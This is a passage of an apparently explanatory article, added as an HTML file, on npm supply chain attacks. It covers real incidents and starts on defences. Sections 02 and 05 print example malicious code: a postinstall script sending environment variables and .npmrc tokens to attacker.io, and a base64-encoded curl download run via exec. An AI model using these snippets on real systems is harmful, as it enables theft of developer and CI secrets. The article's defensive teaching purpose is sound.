@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>npm Supply Chain Attacks: What Actually Happens Inside Your Registry</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,400;1,700&family=DM+Sans:wght@300;400;500&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
+<style>
+  :root {
+    --ink: #0f0e0c;
+    --paper: #f5f0e8;
+    --accent: #c84b31;
+    --accent2: #2a6e4a;
+    --muted: #8a8275;
+    --rule: #d4cdc0;
+    --highlight: #fff3b0;
+    --code-bg: #1e1e1e;
+    --code-text: #d4d4d4;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    font-family: 'DM Sans', sans-serif;
+    background: var(--paper);
+    color: var(--ink);
+    font-size: 17px;
+    line-height: 1.75;
+    overflow-x: hidden;
+  }
+
+  /* MASTHEAD */
+  .masthead {
+    background: var(--ink);
+    color: var(--paper);
+    text-align: center;
+    padding: 12px 24px;
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+  }
+
+  /* HERO */
+  .hero {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 64px 32px 40px;
+    border-bottom: 2px solid var(--ink);
+  }
+
+  .hero-label {
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 20px;
+  }
+
+  .hero h1 {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(2.4rem, 5vw, 4rem);
+    font-weight: 900;
+    line-height: 1.08;
+    letter-spacing: -0.02em;
+    margin-bottom: 24px;
+  }
+
+  .hero h1 em {
+    font-style: italic;
+    color: var(--accent);
+  }
+
+  .hero-sub {
+    font-size: 1.15rem;
+    color: var(--muted);
+    max-width: 640px;
+    line-height: 1.6;
+    margin-bottom: 32px;
+    font-weight: 300;
+  }
+
+  .byline {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--muted);
+    border-top: 1px solid var(--rule);
+    padding-top: 20px;
+    flex-wrap: wrap;
+  }
+
+  .byline-dot {
+    width: 4px; height: 4px;
+    border-radius: 50%;
+    background: var(--rule);
+  }
+
+  /* LAYOUT */
+  .content-wrap {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 0 32px;
+  }
+
+  /* SECTIONS */
+  section {
+    padding: 52px 0;
+    border-bottom: 1px solid var(--rule);
+  }
+  section:last-child { border-bottom: none; }
+
+  .section-num {
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.25em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 10px;
+  }
+
+  h2 {
+    font-family: 'Playfair Display', serif;
+    font-size: 1.9rem;
+    font-weight: 700;
+    line-height: 1.2;
+    margin-bottom: 24px;
+    letter-spacing: -0.01em;
+  }
+
+  h3 {
+    font-family: 'Playfair Display', serif;
+    font-size: 1.25rem;
+    font-weight: 700;
+    margin: 32px 0 12px;
+    font-style: italic;
+  }
+
+  p { margin-bottom: 18px; }
+  p:last-child { margin-bottom: 0; }
+
+  strong { font-weight: 500; }
+
+  /* PULL QUOTE */
+  .pull-quote {
+    border-left: 4px solid var(--accent);
+    padding: 4px 0 4px 28px;
+    margin: 36px 0;
+  }
+  .pull-quote p {
+    font-family: 'Playfair Display', serif;
+    font-size: 1.35rem;
+    font-style: italic;
+    line-height: 1.45;
+    color: var(--ink);
+    margin: 0;
+  }
+
+  /* CALLOUT BOX */
+  .callout {
+    background: var(--ink);
+    color: var(--paper);
+    border-radius: 4px;
+    padding: 28px 32px;
+    margin: 32px 0;
+  }
+  .callout .callout-label {
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 10px;
+  }
+  .callout p {
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: #d8d2c6;
+    margin-bottom: 10px;
+  }
+  .callout p:last-child { margin-bottom: 0; }
+
+  /* HIGHLIGHT BOX */
+  .highlight-box {
+    background: var(--highlight);
+    border: 1px solid #e0d06a;
+    border-radius: 4px;
+    padding: 20px 24px;
+    margin: 28px 0;
+    font-size: 0.93rem;
+  }
+  .highlight-box strong {
+    display: block;
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+    color: #7a6a00;
+  }
+
+  /* CODE BLOCK */
+  .code-block {
+    background: var(--code-bg);
+    border-radius: 6px;
+    padding: 24px 28px;
+    margin: 28px 0;
+    overflow-x: auto;
+  }
+  .code-block .code-label {
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: #6a9955;
+    margin-bottom: 14px;
+  }
+  .code-block pre {
+    font-family: 'DM Mono', monospace;
+    font-size: 12.5px;
+    line-height: 1.7;
+    color: var(--code-text);
+    white-space: pre;
+  }
+  .code-kw  { color: #569cd6; }
+  .code-fn  { color: #dcdcaa; }
+  .code-str { color: #ce9178; }
+  .code-cmt { color: #6a9955; font-style: italic; }
+  .code-num { color: #b5cea8; }
+  .code-var { color: #9cdcfe; }
+
+  /* ARCHITECTURE DIAGRAM */
+  .arch-diagram {
+    background: #fff;
+    border: 1px solid var(--rule);
+    border-radius: 6px;
+    padding: 32px;
+    margin: 32px 0;
+    font-family: 'DM Mono', monospace;
+    font-size: 12px;
+    overflow-x: auto;
+  }
+  .arch-title {
+    font-size: 10px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 24px;
+  }
+
+  /* FLOW NODES */
+  .flow {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0;
+    align-items: center;
+    margin: 24px 0;
+  }
+  .flow-node {
+    background: var(--ink);
+    color: var(--paper);
+    padding: 10px 18px;
+    border-radius: 4px;
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    font-weight: 500;
+    white-space: nowrap;
+  }
+  .flow-node.green  { background: var(--accent2); }
+  .flow-node.red    { background: var(--accent); }
+  .flow-node.muted  { background: var(--muted); }
+  .flow-arrow {
+    font-size: 18px;
+    color: var(--muted);
+    padding: 0 8px;
+  }
+
+  /* NUMBERED LIST */
+  ol.styled {
+    counter-reset: item;
+    list-style: none;
+    margin: 20px 0;
+    padding: 0;
+  }
+  ol.styled li {
+    counter-increment: item;
+    display: flex;
+    gap: 16px;
+    margin-bottom: 18px;
+    align-items: flex-start;
+  }
+  ol.styled li::before {
+    content: counter(item, decimal-leading-zero);
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    min-width: 28px;
+    padding-top: 3px;
+  }
+
+  /* STAT STRIP */
+  .stat-strip {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 1px;
+    background: var(--rule);
+    border: 1px solid var(--rule);
+    border-radius: 4px;
+    overflow: hidden;
+    margin: 32px 0;
+  }
+  .stat-item {
+    background: #fff;
+    padding: 20px 20px;
+    text-align: center;
+  }
+  .stat-num {
+    font-family: 'Playfair Display', serif;
+    font-size: 2.2rem;
+    font-weight: 900;
+    color: var(--accent);
+    line-height: 1;
+    margin-bottom: 6px;
+  }
+  .stat-label {
+    font-family: 'DM Mono', monospace;
+    font-size: 9.5px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--muted);
+    line-height: 1.3;
+  }
+
+  /* TAG */
+  .tag {
+    display: inline-block;
+    background: var(--rule);
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    padding: 3px 9px;
+    border-radius: 2px;
+    margin: 2px 3px 2px 0;
+    color: var(--muted);
+  }
+  .tag.green { background: #d4ede0; color: var(--accent2); }
+  .tag.red   { background: #fde8e3; color: var(--accent); }
+
+  /* DIVIDER */
+  .ornament {
+    text-align: center;
+    color: var(--muted);
+    font-size: 1.4rem;
+    letter-spacing: 0.5em;
+    padding: 8px 0;
+  }
+
+  /* FOOTNOTE */
+  .footnote {
+    font-size: 0.82rem;
+    color: var(--muted);
+    font-style: italic;
+    border-top: 1px solid var(--rule);
+    padding-top: 16px;
+    margin-top: 40px;
+    padding-bottom: 40px;
+  }
+
+  /* RESPONSIVE */
+  @media (max-width: 600px) {
+    .hero, .content-wrap { padding-left: 20px; padding-right: 20px; }
+    .flow { flex-direction: column; align-items: flex-start; }
+    .flow-arrow { transform: rotate(90deg); }
+  }
+</style>
+</head>
+<body>
+
+<div class="masthead">Security Engineering &nbsp;·&nbsp; npm Ecosystem &nbsp;·&nbsp; Supply Chain</div>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-label">Deep Dive · npm Security</div>
+  <h1>npm Supply Chain Attacks: <em>What Actually Happens Inside Your Registry</em></h1>
+  <p class="hero-sub">A proper look at how attackers get into your dependency tree, what they do once they are in, and why your lockfile alone is not going to save you.</p>
+  <div class="byline">
+    <span>By Divyansh Singh</span>
+    <span class="byline-dot"></span>
+    <span>April 2026</span>
+    <span class="byline-dot"></span>
+    <span>~20 min read</span>
+    <span class="byline-dot"></span>
+    <span class="tag red">Security</span>
+    <span class="tag">npm</span>
+    <span class="tag">Supply Chain</span>
+  </div>
+</div>
+
+<div class="content-wrap">
+
+  <!-- 01 -->
+  <section>
+    <div class="section-num">01 · The Problem Nobody Wants to Talk About</div>
+    <h2>You Are Running Code You Have Never Read</h2>
+    <p>Let me say something that is technically obvious but practically terrifying: every time you run <code>npm install</code>, you are executing untrusted code with full access to your file system, your environment variables, your SSH keys, and in CI pipelines, your production secrets. And you are doing this hundreds of times a day, for packages you have never looked at, written by people you have never met.</p>
+    <p>The average Node.js project has somewhere between 500 and 1,000 transitive dependencies. You directly depend on maybe 30 of them. The rest come along for the ride because some package you trust depends on another package, which depends on another, which depends on a four-line utility someone published in 2014 and forgot about. That forgotten package is now running inside your CI pipeline.</p>
+    <p>This is not a hypothetical problem. The <strong>event-stream incident of 2018</strong>, the <strong>ua-parser-js takeover of 2021</strong>, the <strong>node-ipc protest-ware saga of 2022</strong>, and the <strong>XZ Utils near-miss of 2024</strong> (not npm, but the same category of attack) are all variations of the same theme: someone got write access to a package that millions of people trust, and they used that access to do something the users did not consent to.</p>
+    <p>What I want to do in this piece is go beyond the headlines and actually explain the mechanics. How does an attacker get into your registry in the first place? What does malicious code in a postinstall script actually look like? How does typosquatting work at scale? And what, realistically, can you do about it?</p>
+
+    <div class="stat-strip">
+      <div class="stat-item">
+        <div class="stat-num">2.5M</div>
+        <div class="stat-label">Packages on<br/>the npm Registry</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">~800</div>
+        <div class="stat-label">Avg Transitive Deps<br/>per Project</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">1 in 8</div>
+        <div class="stat-label">npm Packages With<br/>Known Vulnerabilities</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">$50B+</div>
+        <div class="stat-label">Estimated Cost of<br/>Supply Chain Attacks</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 02 -->
+  <section>
+    <div class="section-num">02 · Attack Vectors</div>
+    <h2>The Five Ways Attackers Actually Get In</h2>
+    <p>There is a tendency to treat supply chain attacks as a single monolithic threat. In practice, they are a family of very different techniques that share a common goal: getting malicious code into a package that legitimate developers will install without question. Understanding the distinctions matters because the defences are different for each.</p>
+
+    <h3>Account Takeover</h3>
+    <p>This is the most straightforward and arguably the most dangerous vector. An attacker compromises the npm account of a legitimate, trusted package maintainer and publishes a new version containing malicious code. The <strong>ua-parser-js</strong> attack worked exactly like this. The maintainer's npm credentials were stolen, and within hours a new version was out with a cryptominer and a credential-harvesting script baked into the postinstall hook. Because ua-parser-js has somewhere in the range of eight million weekly downloads and is a dependency of Facebook's tooling, Google's tooling, and countless enterprise projects, the blast radius was enormous.</p>
+    <p>What makes account takeover so effective is that it subverts trust entirely. The package is the genuine package, published by the genuine namespace, signed with what appears to be the genuine maintainer's identity. There is no typo to catch, no unusual namespace to notice. If you are not pinning exact versions and auditing changelogs on every dependency update, you will pull it straight in.</p>
+
+    <h3>Dependency Confusion</h3>
+    <p>This one is genuinely clever, and it was Alex Birsan's 2021 research that made the whole industry sit up and pay attention. Here is the setup: many companies use private npm registries to host internal packages. A package called <code>@mycompany/utils</code> might live on their private Artifactory or Nexus instance and never be published to the public npm registry.</p>
+    <p>The attack works like this: publish a package with the same name to the public npm registry, but give it a very high version number, say 9.9.9. When the victim's build system runs <code>npm install</code>, it checks both the private registry and the public registry and, depending on the configuration, may prefer the higher version from the public registry. Your internal package name suddenly resolves to the attacker's code.</p>
+    <p>Birsan reported this to dozens of companies as a bug bounty exercise and received payouts from Microsoft, Apple, PayPal, Shopify, Tesla, and others. These are not small startups with lax security practices. This is a systematic misconfiguration that affects almost every enterprise that uses private registries without explicit scope locking.</p>
+
+    <h3>Typosquatting</h3>
+    <p>If you have ever typed <code>npm install lodahs</code> instead of <code>lodash</code>, you have brushed past a typosquatting opportunity. Attackers register package names that are plausible misspellings or near-homoglyphs of popular packages, then wait for developers to make a typo. <code>crossenv</code> instead of <code>cross-env</code>, <code>babelcli</code> instead of <code>babel-cli</code>, <code>jquery.js</code> instead of the scoped package.</p>
+    <p>This is low-effort and statistically reliable at scale. Publish enough typosquats and some fraction of the developer population will install them. npm has gotten better at catching obvious cases, but the registry is too large for manual review of every new publication, and the tooling to detect typosquats is imperfect.</p>
+
+    <h3>Protestware and Insider Threats</h3>
+    <p>The <strong>node-ipc incident</strong> in March 2022 was a genuinely new category. The maintainer of a legitimate, widely-used package deliberately introduced code that would detect whether the machine running it had a Russian or Belarusian IP address, and if so, would overwrite files on the disk with heart emoji. This was not a compromise. The maintainer did this intentionally, as a form of protest against the war in Ukraine.</p>
+    <p>Whatever your politics, the technical lesson is unsettling: you are implicitly trusting not just the security practices of package maintainers, but their judgment, their mental state, and their values. An insider threat in an open source context looks exactly like normal package development right up until the moment it does not.</p>
+
+    <h3>Malicious Postinstall Scripts</h3>
+    <p>npm's lifecycle hooks are a legitimate feature. Many packages need to compile native binaries, download platform-specific assets, or run setup steps after installation. The <code>postinstall</code> field in <code>package.json</code> is how they do it. It is also one of the most obvious vectors for malicious code, because it executes automatically during <code>npm install</code> without any additional user action.</p>
+
+    <div class="code-block">
+      <div class="code-label">package.json — postinstall hook used legitimately and maliciously</div>
+      <pre><span class="code-cmt">// Legitimate usage: compiling a native module</span>
+{
+  <span class="code-str">"scripts"</span>: {
+    <span class="code-str">"postinstall"</span>: <span class="code-str">"node-gyp rebuild"</span>
+  }
+}
+
+<span class="code-cmt">// What an attacker's postinstall looks like</span>
+{
+  <span class="code-str">"scripts"</span>: {
+    <span class="code-str">"postinstall"</span>: <span class="code-str">"node ./scripts/setup.js"</span>
+  }
+}
+
+<span class="code-cmt">// And setup.js contains something like this</span>
+<span class="code-kw">const</span> <span class="code-var">https</span> = <span class="code-fn">require</span>(<span class="code-str">'https'</span>);
+<span class="code-kw">const</span> <span class="code-var">os</span> = <span class="code-fn">require</span>(<span class="code-str">'os'</span>);
+<span class="code-kw">const</span> <span class="code-var">fs</span> = <span class="code-fn">require</span>(<span class="code-str">'fs'</span>);
+
+<span class="code-cmt">// Harvest env vars and send to attacker-controlled server</span>
+<span class="code-kw">const</span> <span class="code-var">payload</span> = {
+  env: <span class="code-var">process</span>.env,
+  hostname: <span class="code-var">os</span>.<span class="code-fn">hostname</span>(),
+  username: <span class="code-var">os</span>.<span class="code-fn">userInfo</span>().<span class="code-var">username</span>,
+  npmrc: <span class="code-var">fs</span>.<span class="code-fn">existsSync</span>(<span class="code-str">`${os.homedir()}/.npmrc`</span>)
+           ? <span class="code-var">fs</span>.<span class="code-fn">readFileSync</span>(<span class="code-str">`${os.homedir()}/.npmrc`</span>, <span class="code-str">'utf8'</span>)
+           : <span class="code-str">null</span>
+};
+
+<span class="code-cmt">// Exfiltrate silently — no stdout, no stderr</span>
+<span class="code-kw">const</span> <span class="code-var">req</span> = <span class="code-var">https</span>.<span class="code-fn">request</span>({ host: <span class="code-str">'attacker.io'</span>, path: <span class="code-str">'/collect'</span>, method: <span class="code-str">'POST'</span> });
+<span class="code-var">req</span>.<span class="code-fn">write</span>(<span class="code-var">JSON</span>.<span class="code-fn">stringify</span>(<span class="code-var">payload</span>));
+<span class="code-var">req</span>.<span class="code-fn">end</span>();</pre>
+    </div>
+
+    <p>The above is simplified, but this is essentially what the event-stream malware was doing. It targeted the <strong>Copay Bitcoin wallet</strong> specifically, harvesting private keys from machines where the wallet was installed. It only activated in production builds. It was hidden inside a dependency of a dependency of a dependency. It sat undetected for two months.</p>
+  </section>
+
+  <!-- 03 -->
+  <section>
+    <div class="section-num">03 · Inside the Registry</div>
+    <h2>How npm's Publication Pipeline Actually Works</h2>
+    <p>To understand why these attacks succeed, you need to understand what happens when a package is published. The answer, bluntly, is: not very much gatekeeping.</p>
+    <p>When you run <code>npm publish</code>, the npm CLI packages your project into a tarball, sends it to the registry with your auth token, and the registry makes it available almost immediately. There is no human review. There is automated scanning for some known malware patterns, but it is reactive rather than comprehensive. The registry trusts the publisher.</p>
+
+    <div class="arch-diagram">
+      <div class="arch-title">npm publish pipeline</div>
+      <div class="flow">
+        <div class="flow-node green">Developer</div>
+        <div class="flow-arrow">&#8594;</div>
+        <div class="flow-node">npm pack</div>
+        <div class="flow-arrow">&#8594;</div>
+        <div class="flow-node">Auth Check</div>
+        <div class="flow-arrow">&#8594;</div>
+        <div class="flow-node muted">Automated Scan</div>
+        <div class="flow-arrow">&#8594;</div>
+        <div class="flow-node red">Public Registry</div>
+        <div class="flow-arrow">&#8594;</div>
+        <div class="flow-node">CDN / Cache</div>
+      </div>
+      <p style="margin-top:16px; color: var(--muted); font-size:11px;">Auth check validates the token, not the publisher's intent. Automated scan catches signatures of known malware, not novel attacks. There is no code review step.</p>
+    </div>
+
+    <h3>The Token Problem</h3>
+    <p>npm auth tokens are long-lived by default and are stored in plaintext in <code>~/.npmrc</code>. They have historically had no granular permission controls. A token that can publish also has read access to all private packages the account can see. There was no concept of "publish-only" or "read-only" scoped tokens until npm introduced granular access tokens in 2022, and adoption has been slow.</p>
+    <p>What this means practically: if an attacker exfiltrates a developer's <code>.npmrc</code> file, which many postinstall scripts specifically look for, they get a token that lets them publish new versions of every package the developer maintains. The credential theft and the supply chain attack are one smooth operation.</p>
+
+    <h3>The Provenance Gap</h3>
+    <p>Until very recently, there was no reliable way to verify that a package published on the npm registry actually came from the source code it claimed to come from. A package claiming to be built from the <code>lodash/lodash</code> GitHub repository could have been built from a modified local copy. You had to trust the publisher's word.</p>
+    <p>npm introduced <strong>package provenance</strong> in 2023, which uses Sigstore to create a cryptographic link between a published package and the specific commit and CI pipeline that built it. This is genuinely good. The problem is that provenance is opt-in, and most packages, including many critical ones, do not have it yet.</p>
+
+    <div class="pull-quote">
+      <p>"The registry trusts the publisher completely. Your entire defence against supply chain attacks sits on the strength of one person's npm password and their 2FA setup."</p>
+    </div>
+  </section>
+
+  <!-- 04 -->
+  <section>
+    <div class="section-num">04 · Real Incidents</div>
+    <h2>The Attacks That Actually Happened, Dissected</h2>
+
+    <h3>event-stream (2018): The Slow Burn</h3>
+    <p>This remains the most instructive supply chain attack in the npm ecosystem's history, mostly because of how long it took to unfold and how carefully it was constructed. The attacker, going by the handle <strong>right9ctrl</strong>, reached out to the original maintainer of event-stream, a widely-used streaming utility, and offered to help maintain it. The maintainer, who had mostly moved on from the project, agreed and granted publish access.</p>
+    <p>Right9ctrl then added a new dependency: <code>flatmap-stream</code>, a package they themselves had published. Inside flatmap-stream, in the encrypted payload of one of the JavaScript files, was code that would only activate in a very specific context: when the package was running inside the Copay Bitcoin wallet application. It looked for specific Bitcoin key structures and exfiltrated them.</p>
+    <p>The attack was in the wild for two months. It was eventually discovered not by any automated security tooling, but by a developer who noticed an unusual dependency and filed a GitHub issue. The response from the community, once it spread, was immediate, but the window of exposure was enormous.</p>
+
+    <div class="highlight-box">
+      <strong>Why event-stream worked</strong>
+      <p>The malicious code was in an encrypted payload, not readable JavaScript. Static analysis tools could not see it. It only activated for a specific target, so broad behavioural analysis would not trigger it. The dependency chain was deep enough that most developers had no reason to audit it. And it came from a legitimate maintainer account with a genuine history of contributions.</p>
+    </div>
+
+    <h3>ua-parser-js (2021): The Speed Attack</h3>
+    <p>If event-stream was a slow, targeted operation, the ua-parser-js attack was the opposite. It moved fast and cast a wide net. The attacker compromised the maintainer's npm account and published three new versions in quick succession: 0.7.29, 0.8.0, and 1.0.0. Each contained a postinstall script that would download and run a shell script, which in turn dropped a cryptominer on Linux systems and a credential-stealing Trojan on Windows.</p>
+    <p>Because ua-parser-js is a dependency of npm's own tooling, Google's Chrome apps infrastructure, and Facebook's React development stack, the potential reach was staggering. npm yanked the malicious versions within hours, but the attacker clearly understood that speed was the strategy. Even a small window of exposure across that download volume translates to a meaningful number of compromised machines.</p>
+
+    <h3>node-ipc (2022): When the Maintainer Is the Threat</h3>
+    <p>node-ipc is used by Vue CLI, which meant it had a large, legitimate install base. Its maintainer, Brandon Nozaki Miller, was a real person with a public history in the open source community. In version 10.1.1 and 10.1.2, he deliberately introduced code that checked the machine's public IP address against geolocation data and, if the machine appeared to be in Russia or Belarus, would recursively overwrite files with a peace emoji.</p>
+    <p>The response from the security community was sharp. Maintainers do have significant power over their packages, and there is essentially no technical mechanism to prevent a maintainer from doing this. The only protection is detecting it quickly and pinning to a known-good version. Vue CLI moved to fork the package. npm eventually removed the malicious versions, but not before a non-trivial number of machines in affected countries had their files corrupted.</p>
+
+    <div class="stat-strip">
+      <div class="stat-item">
+        <div class="stat-num">2mo</div>
+        <div class="stat-label">event-stream<br/>Window of Exposure</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">8M+</div>
+        <div class="stat-label">Weekly Downloads<br/>of ua-parser-js</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">3hr</div>
+        <div class="stat-label">Time to Yank<br/>ua-parser-js Attack</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">1M+</div>
+        <div class="stat-label">Projects Using<br/>node-ipc via Vue CLI</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 05 -->
+  <section>
+    <div class="section-num">05 · The Technical Mechanics</div>
+    <h2>What Malicious Package Code Actually Looks Like</h2>
+    <p>Security articles tend to describe these attacks in vague terms. Let us be more concrete about what the code itself looks like, and how it hides.</p>
+
+    <h3>Obfuscation Techniques</h3>
+    <p>Sophisticated attacks do not put their payload in plain JavaScript. The techniques used to hide malicious code include base64-encoded strings that are decoded at runtime, encrypted payloads that require a key derived from the target environment, split strings that are only concatenated at execution time, and dead-looking code that only activates when a specific condition is met.</p>
+
+    <div class="code-block">
+      <div class="code-label">Common obfuscation patterns in malicious packages</div>
+      <pre><span class="code-cmt">// Pattern 1: Base64-encoded payload, decoded at runtime</span>
+<span class="code-kw">const</span> <span class="code-var">exec</span> = <span class="code-fn">require</span>(<span class="code-str">'child_process'</span>).<span class="code-var">exec</span>;
+<span class="code-var">exec</span>(<span class="code-var">Buffer</span>.<span class="code-fn">from</span>(
+  <span class="code-str">'Y3VybCBodHRwczovL2F0dGFja2VyLmlvL3BheWxvYWQuc2g='</span>,
+  <span class="code-str">'base64'</span>
+).<span class="code-fn">toString</span>());
+
+<span class="code-cmt">// Pattern 2: Environment-conditioned activation</span>
+<span class="code-kw">const</span> <span class="code-var">isCi</span> = <span class="code-var">process</span>.<span class="code-var">env</span>.<span class="code-var">CI</span> || <span class="code-var">process</span>.<span class="code-var">env</span>.<span class="code-var">GITHUB_ACTIONS</span>;
+<span class="code-kw">if</span> (<span class="code-var">isCi</span>) {
+  <span class="code-cmt">// Only run in CI — where secrets live</span>
+  <span class="code-fn">exfiltrate</span>(<span class="code-var">process</span>.<span class="code-var">env</span>);
+}
+
+<span class="code-cmt">// Pattern 3: String splitting to defeat static analysis</span>
+<span class="code-kw">const</span> <span class="code-var">h</span> = <span class="code-str">'att'</span> + <span class="code-str">'ack'</span> + <span class="code-str">'er'</span> + <span class="code-str">'.io'</span>;
+<span class="code-kw">const</span> <span class="code-var">p</span> = <span class="code-str">'/co'</span> + <span class="code-str">'lle'</span> + <span class="code-str">'ct'</span>;
+
+<span class="code-cmt">// Pattern 4: Prototype pollution to affect downstream code</span>
+<span class="code-var">Object</span>.<span class="code-var">prototype</span>.<span class="code-var">__defineGetter__</span>(<span class="code-str">'toJSON'</span>, <span class="code-kw">function</span>() {
+  <span class="code-fn">exfiltrate</span>(<span class="code-kw">this</span>); <span class="code-cmt">// Fires whenever any object is serialised</span>
+  <span class="code-kw">return</span> <span class="code-var">JSON</span>.<span class="code-var">prototype</span>.<span class="code-var">toJSON</span>;
+});</pre>
+    </div>
+
+    <h3>Targeting CI Environments Specifically</h3>
+    <p>One pattern that has become more common is malicious packages that specifically check whether they are running in a CI environment before activating. This is actually quite smart from an attacker's perspective. CI environments are where your secrets live. The <code>AWS_ACCESS_KEY_ID</code>, the database password, the Stripe secret key, the Kubernetes config, the Docker Hub credentials. They also tend to have looser sandboxing than production, because the assumption is that the code running there is trusted.</p>
+    <p>A package that only misbehaves in CI will fly under the radar in local developer testing. The developer installs it, it behaves normally, they commit. The moment it runs in GitHub Actions or CircleCI, it exfiltrates the secret store and exits cleanly. By the time anyone investigates, the credentials have already been used.</p>
+
+    <div class="callout">
+      <div class="callout-label">What attackers actually want</div>
+      <p>The target varies by sophistication. Script-kiddie level attacks go for easy wins: cryptominer deployment, credential files like <code>~/.npmrc</code> and <code>~/.aws/credentials</code>, and SSH keys. Mid-tier attacks target CI secrets: deployment tokens, cloud provider credentials, and code-signing certificates. The most sophisticated attacks are targeted at specific organisations or specific software, like the event-stream attack on Copay's Bitcoin wallet.</p>
+      <p>The common thread is that access to your build environment is extremely valuable because it is trusted by definition. Code that your build pipeline runs becomes code that your production infrastructure implicitly trusts.</p>
+    </div>
+  </section>
+
+  <!-- 06 -->
+  <section>
+    <div class="section-num">06 · Your Actual Attack Surface</div>
+    <h2>Mapping the Risk in a Real Project</h2>
+    <p>Let us be concrete about what the attack surface looks like for a typical mid-size Node.js application. I am going to use a hypothetical but representative project: a React frontend with a Node.js backend, using the usual suspects for tooling.</p>
+
+    <h3>The Direct Dependency Layer</h3>
+    <p>This is the layer you can actually see and audit. Your <code>package.json</code> lists maybe 40 to 60 direct dependencies. You can read their changelogs. You can audit their GitHub repositories. You have chosen them deliberately. This is the layer most security advice focuses on, and it is also the least interesting from an attacker's perspective, because it is the most watched.</p>
+
+    <h3>The Transitive Dependency Layer</h3>
+    <p>This is where things get interesting. Your 50 direct dependencies have their own dependencies, and those have their own, and so on. A realistic project ends up with somewhere between 600 and 1,200 packages installed. You have not made a deliberate choice about any of them. You cannot realistically audit them. Many of them are maintained by a single person working in their spare time.</p>
+    <p>Run <code>npm list --all</code> in a moderately complex project and look at what comes back. You will find packages that have not been updated in five years. You will find packages maintained by accounts with no 2FA. You will find packages with three lines of code and ten million weekly downloads. Each one is an implicit trust decision you have made without knowing it.</p>
+
+    <h3>The Lifecycle Script Layer</h3>
+    <p>Even if every package in your tree is perfectly legitimate, the lifecycle scripts they run during installation execute before your application code runs, before your security tooling runs, and with the full permissions of the user running npm. On a developer's machine this means access to everything that developer can access. In CI, it means access to whatever secrets are in the environment.</p>
+
+    <div class="arch-diagram">
+      <div class="arch-title">Attack surface layers in a Node.js project</div>
+      <div style="font-family: 'DM Mono', monospace; font-size: 12px; line-height: 2;">
+        <div style="color: var(--accent2); margin-bottom: 4px;">Layer 1: Direct Dependencies (you chose these)</div>
+        <div style="padding-left: 24px; color: var(--muted);">~50 packages, auditable, maintained, visible in package.json</div>
+        <div style="color: var(--muted); margin: 8px 0 4px;">&#8595;</div>
+        <div style="color: #c47d10; margin-bottom: 4px;">Layer 2: Transitive Dependencies (you inherited these)</div>
+        <div style="padding-left: 24px; color: var(--muted);">~800 packages, mostly unreviewed, maintained by strangers</div>
+        <div style="color: var(--muted); margin: 8px 0 4px;">&#8595;</div>
+        <div style="color: var(--accent); margin-bottom: 4px;">Layer 3: Lifecycle Scripts (they run at install time)</div>
+        <div style="padding-left: 24px; color: var(--muted);">Arbitrary code execution, full environment access, no sandbox</div>
+        <div style="color: var(--muted); margin: 8px 0 4px;">&#8595;</div>
+        <div style="background: var(--accent); color: white; padding: 8px 12px; border-radius: 3px; display: inline-block; margin-top: 4px;">Your secrets, credentials, filesystem, network</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 07 -->
+  <section>
+    <div class="section-num">07 · Defences That Actually Work</div>
+    <h2>What You Can Realistically Do About This</h2>
+    <p>Here is the frustrating truth: there is no single fix. Supply chain security is a posture, not a tool. But there are specific, practical things that meaningfully reduce your exposure, and I want to be honest about which ones actually work and which ones make people feel secure without doing much.</p>
+
+    <h3>Lock Your Lockfile and Verify It</h3>
+    <p>Using <code>npm ci</code> instead of <code>npm install</code> in CI environments is table stakes. It installs exactly what is in your lockfile and fails if the lockfile does not match package.json. But a lockfile alone only protects against newly introduced versions. If a malicious version was already in your lockfile before you started using <code>npm ci</code>, you are still running it.</p>
+    <p>The more important habit is treating your lockfile as a security artifact. Review lockfile diffs in pull requests. A PR that changes twenty lines of application code but updates sixty packages in the lockfile is a PR that deserves scrutiny.</p>
+
